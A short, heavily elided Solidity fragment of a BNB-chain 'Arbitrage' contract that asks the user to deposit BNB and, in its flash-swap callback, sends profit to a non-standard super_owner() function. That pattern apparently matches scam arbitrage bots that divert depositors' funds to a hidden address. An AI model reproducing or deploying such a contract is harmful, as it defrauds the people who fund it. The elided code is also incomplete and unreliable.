...
contract Arbitrage is Ownable{
  ...
  IUniswapV2Router02 public bakeryRouter; //0xCDe540d7eAFE93aC5fE6233Bee57E1270D3E330F
  ...
  function startArbitrage(
    ...
    require(address(this).balance != 0, "Insuffisant balance. Please deposit BNB in your smart contract");
  ...
  function pancakeCall(
    ...
    otherToken.transfer(super_owner(), amountReceived - amountRequired);
  }
